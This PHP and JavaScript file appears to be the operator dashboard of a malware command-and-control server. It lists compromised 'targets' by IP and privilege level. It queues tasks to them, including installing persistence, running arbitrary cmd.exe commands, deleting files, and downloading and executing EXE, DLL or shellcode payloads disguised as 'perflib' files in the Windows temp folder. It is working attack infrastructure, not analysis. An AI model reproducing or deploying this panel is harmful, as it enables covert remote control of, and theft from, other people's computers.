<?php
ob_start();
require_once('./includes/lock.php');
require_once('./includes/conf.php');
require_once('./includes/mysql.php');
?>
<?php if(!isset($_GET['reload'])):?><html>
    <head>
<?php include_once('./includes/header.inc.php') ?>
        <title>Control Panel</title>      
    </head>
    <body>
		<!-- Fixed navbar -->
		<div class="navbar navbar-default" role="navigation" style="margin-top: 15px;">
			<div class="container">
				<div class="navbar-header">
					<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
						<span class="sr-only">Toggle navigation</span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
					</button>
                                        <ul class="nav navbar-nav navbar-left">
                                            <li><a href="#">Control Panel</a></li>
                                        </ul>
				</div>
				<div class="navbar-collapse collapse">
					<ul class="nav navbar-nav">
						<a class="navbar-brand"><img style="margin-top: -15px; margin-left: 350px; height: 100px;" src="./images/tb.jpg"/></a>
					</ul>
					<ul class="nav navbar-nav navbar-right">
                                                <li class="active"><a href="index.php">Home</a></li>
						<li><a data-toggle="modal" href="metcreator.php" data-target="#myModal">MetCreator</a></li>
						<li><a href='logout.php'>Logout</a></li>
					</ul>
				</div><!--/.nav-collapse -->
			</div>
		</div>
			<div id="results">
			</div>    
			
				<form id='schedule' name='schedule' class="form" action="maintenance.php" method='POST'>
					<input type='hidden' name='target' id='target' value=''>
					<table id='maint_targets' class="table">
						<tr>
							<th>Action</th>
							<th>Command</th>
							<th>Arguments</th>
							<th class="runas">Run As</th>
							<th></th>
						</tr>

						<tr>
							<td>
								<select style="max-width: 100%;" class="form-control" name='type' id='type' onchange='populate();'>
									<option value='0'>Select one...</option>
									<option value='5'>Change CB Timeout (Minutes)</option>
									<option value='5'>Install Persistence</option>
									<!--"Schedule" commands-->
									<option value='11'>Get Process List</option>
									<option value='12'>Get Directory Listing</option>
									<option value='13'>Check Network Connections</option>
									<option value='14'>Run a Command</option>
									<option value='15'>Check Installed Software</option>
									<option value='16'>Delete File</option>
									<option value='1'>Execute a file </option>
									<option value='10'>Sleep</option>
									<option value='2'>Download & Execute Exe</option>
									<option value='3'>Download File</option>
									<option value='4'>Download & Execute Dll</option>
									<option value='9'>Download & Execute Shellcode</option>
									<option value='6'>Upgrade Implant</option>
									<option value='7'>Uninstall Implant</option>
								</select>
							</td>

							<td>
								<input style="max-width: 100%;" type='text' class="form-control" id='command' name='command' size='50' />
							</td>

							<td>
								<input style="max-width: 100%;" type='text' class="form-control" id='arguments' name='arguments' size='50' />
							</td>

							<td class="runas" style="min-width: 80px;">
								<input type="checkbox" class="form-control" class="runas" name="runas" id="runas">
							</td>
							<td>
	                    <center><input type='submit' class="btn btn-primary" name='submit' id='submit' value='Submit'></center>
						</td>
						</tr>
					</table>

				</form>
			
			
    <div id='reloadDiv'>
<?php endif;?>    

<?php
$result = DB::query("SELECT * FROM parameters ORDER BY `lastupdate` DESC");
$count = DB::count();
?>
		
<?php
if ($count != 0) {
	?>
				<div class="panel panel-default">
					<div class="panel-heading">
						<h3 class="panel-title">&nbsp;</h3><?php print "<h3 class='panel-title' style='text-align:center; margin-top: -15px'>Current time is " . date("M j, Y g:i a", time()) . ".</h3>"; ?>
					</div>
					<div class="panel-body">



						<table id="targets" class="table">
							<thead>
								<tr>
									<th>Status</th>
									<th>Version</th>
									<th>IP Address</th>
									<th>Target Name</th>
									<th width='110'>Callback Period</th>
									<th>Last Callback</th>
									<th width='180'>Actions</th>
								</tr>
							</thead>

	<?php
	foreach ($result as $row) {
		
		  $result2 = DB::query("SELECT * FROM tasks WHERE id = %s AND status != %s", $row['id'], 2);
		  $count = DB::count();

		  //HIGHLIGHT THE ROW/IMPLANT IF TASKS ARE QUEUED UP
		  if($count != 0)
		  {
		  	if($result2[0]['status'] == 0) print "<tr data-target='". $row['id']."' class='bgrow'>"; //style='background-color: gray'>";
		  	else print "<tr data-target='". $row['id']."' style='background-color: #F18A7E'>";		  	
		  }
		  else print "<tr data-target='". $row['id']."'>";
		?>
								<td>
								<?php
								//PRINT ICON FOR SYSTEM OR NOT

								if ($row['privileges'] == 1)
									print '<span style="margin-right: 10px;font-size: 25px;" data-toggle="tooltip" data-placement="top" title="Running as System" class="glyphicon glyphicon-hdd"></span>';
								else
									print '<span style="margin-right: 10px;font-size: 25px;" data-toggle="tooltip" data-placement="top" title="Running as User" class="glyphicon glyphicon-user"></span>';

								//PRINT ICON FOR PROXY OR NOT

								if ($row['proxyenabled'] == 1)
									print '<span style="margin-right: 10px;font-size: 25px;" data-toggle="tooltip" data-placement="top" title="Proxy Enabled" class="glyphicon glyphicon-random"></span>';
								else
									print '<span style="margin-right: 10px;font-size: 25px;" data-toggle="tooltip" data-placement="top" title="Direct Connection" class="glyphicon glyphicon-transfer"></span>';
								?>
								</td>
								<td><?php print $row['version']; ?></td>
								<td><?php print $row['ipaddress']; ?></td>
								<td width="230"><span data-type="text" class="target_name" data-pk="<?php print $row['id']; ?>"><?php print $row['name']; ?></span></td>
								<td><?php print $row['cbperiod']; ?> minutes</td>
								<td><?php print date("M j, Y g:i a", $row['lastupdate']); ?></td>
								<td>
									<a style="text-decoration: none; margin-right: 10px;" data-toggle="modal" role="button" onclick="clearSelection(true);reloadContent();" class="btn btn-success btn-sm" id="history_<?php echo $row['id']; ?>" href="history.php?name=<?php print $row['name']; ?>&id=<?php print $row['id']; ?>&numlimit=<?php print (int) @$_GET['numlimit']; ?>" data-target="#historyModal"><span class="glyphicon glyphicon-list-alt"></span> History</a>
									<a style="text-decoration: none; margin-right: 10px;" data-toggle="modal" role="button" onclick="clearSelection(true);reloadContent();" class="btn btn-danger btn-sm" id="radar_<?php echo $row['id']; ?>" href="radar.php?name=<?php print $row['name']; ?>&id=<?php print $row['id']; ?>&numlimit_r=<?php print (int) @$_GET['numlimit_r']; ?>" data-target="#radarModal"><span class="glyphicon glyphicon-screenshot"></span> Radar</a>
								</td>
								</tr>
		<?php
	}

	print "</table>";
}
else {
	print "<center><p>No Targets! Get to work!</p></center>";
}
?>

				</div>
			</div>
		</div>
			<script>
				$(document).ready(function() {

<?php if (@$_GET['action'] == 'show_history' and $_GET['id'] !== ''): ?>
					$('#history_<?php echo $_GET['id']; ?>').trigger('click');
					history.pushState(null, null, "index.php");
<?php endif; ?>


<?php if (@$_GET['action'] == 'show_radar' and $_GET['id'] !== ''): ?>
					$('#radar_<?php echo $_GET['id']; ?>').trigger('click');
					history.pushState(null, null, "index.php");
<?php endif; ?>

					initEvents();
				});


				function initEvents(){
				
					$('body').on('hidden.bs.modal', '.modal', function() {
						$(this).removeData('bs.modal');
					});				
				
					//Start with "Run As" column hidden
					$('.runas').hide();

					$.fn.editable.defaults.mode = 'inline';
					$('.target_name').editable({
						url: 'maintenance.php',
						title: 'Enter target name',
						success: function(response, newValue) {
							$('#results').html(response);
							setTimeout(function() {
								$('.alert').hide('slow')
							}, 3000);
						}
					});

					var options = {
						target: '#results',
						cache: false,
						success: function() {
							setTimeout(function() {
								$('.alert').hide('slow'); reloadContent();
							}, 3000);
							$('.colored-row').css('background-color', '').removeClass('selected').removeClass('colored-row').attr('name', '');
							fillTargets();
							$('#schedule').clearForm();
						}
					};

					$('#targets tr').not('thead tr').click(function() {
						if (!$(this).hasClass('selected')) {
							$(this).data('origBg', $(this).css('background-color'));

							<?php 
							if($_SESSION['t'] == 2) 
							{	
								print "$(this).css('background-color', '#669274');";
							}
							else 
							{
								print "$(this).css('background-color', '#336D46');";
							}
							?>

							$(this).addClass('selected');
//							if($(this).data('origBg') !== 'rgb(152, 251, 152)') {
								$(this).addClass('colored-row');
//							} else {
//								$(this).addClass('colored-row');
//							}
						} else {
							$(this).css('background-color', $(this).data().origBg);
							$(this).removeClass('selected');
							$(this).removeClass('colored-row');
							$(this).attr('name', '');
						}

						fillTargets();
					});

					$('#schedule').ajaxForm(options);
					$('span').tooltip();					
				}			
			
			
				function populate()
				{
					document.schedule.command.disabled = true;
					document.schedule.arguments.disabled = true;

					var randomnumber = Math.floor(Math.random() * 50)
					var home = "https://" + document.domain + "/down/";
					var type = document.getElementById('type').value;
					var temppath = 'c:\\windows\\temp'

					//CHANGE CB TIMEOUT
					if (type == 5)
					{
						document.getElementById('command').value = '15';
						document.schedule.command.disabled = false;
						document.schedule.arguments.value = '';
						document.schedule.arguments.disabled = true;
					}
					//UPGRADE IMPLANT
					else if (type == 6)
					{
						document.getElementById('command').value = home + 'perflib32.exe';
						document.schedule.command.disabled = false;
						document.getElementById('arguments').value = 'c:\\windows\\temp\\perflib32.exe';
						document.schedule.arguments.disabled = false;
					}
					//UNINSTALL IMPLANT
					else if (type == 7)
					{
						document.getElementById('command').value = 'Uninstall';
						document.schedule.command.disabled = true;
						document.getElementById('arguments').value = '';
						document.schedule.arguments.disabled = true;
					}

					//
					// SCHEDULE
					//

					//PROCESS LIST
					else if (type == 11)
					{
						document.getElementById('command').value = 'c:\\windows\\system32\\tasklist.exe';
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = false;
						document.schedule.arguments.value = '/v';
					}
					//DIR LISTING
					else if (type == 12)
					{
						document.getElementById('command').value = 'cmd.exe';
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = false;
						document.getElementById('arguments').value = '/c dir c:\\';
					}
					//NETSTAT
					else if (type == 13)
					{
						document.getElementById('command').value = 'c:\\windows\\system32\\netstat.exe';
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = false;
						document.getElementById('arguments').value = '-ano';
					}
					//RUN A COMMAND
					else if (type == 14)
					{
						document.getElementById('command').value = 'cmd.exe';
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = false;
						document.getElementById('arguments').value = '/c ';
					}
					//CHECK INSTALLED SOFTWARE
					else if (type == 15)
					{
						document.getElementById('command').value = 'cmd.exe';
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = false;
						document.getElementById('arguments').value = '/c reg query \"HKLM\\SOFTWARE\"';
					}
					//DELETE FILE
					else if (type == 16)
					{
						document.getElementById('command').value = 'cmd.exe';
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = false;
						document.getElementById('arguments').value = '/c del ' + temppath;
					}
					//EXECUTE A FILE
					else if (type == 1)
					{
						document.getElementById('command').value = '';
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = false;
						document.getElementById('arguments').value = '';
					}
					//DOWNLOAD & EXECUTE EXE
					else if (type == 2)
					{
						document.getElementById('command').value = home;
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = false;
						document.getElementById('arguments').value = temppath + '\\perflib' + randomnumber + '.exe';
					}
					//DOWNLOAD FILE
					else if (type == 3)
					{
						document.getElementById('command').value = home;
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = false;
						document.getElementById('arguments').value = temppath + '\\perflib' + randomnumber + '.log';
					}
					//DOWNLOAD & EXECUTE DLL
					else if (type == 4)
					{
						document.getElementById('command').value = home;
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = false;
						document.getElementById('arguments').value = temppath + '\\perflib' + randomnumber + '.log';
					}
					//DOWNLOAD & EXECUTE SHELLCODE
					else if (type == 9)
					{
						document.getElementById('command').value = home;
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = false;
						document.getElementById('arguments').value = '';
						;
					}
					//SLEEP
					else if (type == 10)
					{
						document.getElementById('command').value = 60;
						document.schedule.command.disabled = false;
						document.schedule.arguments.disabled = true;
						document.getElementById('arguments').value = '0';
					}

					// Hide the "Run As" column if a non-schedule command is selected
					if (type == 0 || type == 5 || type == 6 || type == 7)
					{
						$('.runas').hide();
					}
					else
					{
						$('.runas').show();
					}
				}

				function fillTargets() {
					var targets = '';
					$('#targets tr').not('thead tr').each(function() {
						if ($(this).hasClass('selected')) {
							targets += $(this).data('target') + ';';
						}
					});
					$('#target').attr('value', targets);
				}

				function clearSelection(preserve) {
					setTimeout(function() {
						$('.colored-row').css('background-color', '').removeClass('selected').removeClass('colored-row').attr('name', '');
						fillTargets();
					}, 1000);
				}

				function pull(from, rowname, rowid) {
					// from is 'history' or 'radar'
					var target = $('#log' + rowid);
					if (target.hasClass(from))
					{
						target.html("");
						target.removeClass(from);
					}
					else
					{
						var url = from + '.php?name=' + rowname + '&id=' + rowid;
						$.get(url, function(data, status) {
							target.html(data);

							target.addClass(from);

						});
					}
				}

				function reloadContent() {
					$.ajax({
					  url: "index.php?reload",
					  cache: false
					}).done(function( data ) {
					    $('#reloadDiv').html(data);
					});				
				}
			</script>		
<?php if(!isset($_GET['reload'])):?>
    </div>
		<!-- Modal -->
		<div class="modal" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
			<div class="modal-dialog modal-lg">
				<div class="modal-content">

				</div>
			</div>
		</div>

		<div class="modal" id="radarModal" tabindex="-1" role="dialog" aria-labelledby="radarModalLabel" aria-hidden="true">
			<div class="modal-dialog modal-lg">
				<div class="modal-content">

				</div>
			</div>
		</div>

		<div class="modal" id="historyModal" tabindex="-1" role="dialog" aria-labelledby="historyModalLabel" aria-hidden="true">
			<div class="modal-dialog modal-lg">
				<div class="modal-content">

				</div>
			</div>
			<script>setInterval(function(){ reloadContent() }, 30000);</script>
    </body>
</html>
<?php endif;?>

<?php
ob_flush();
?>
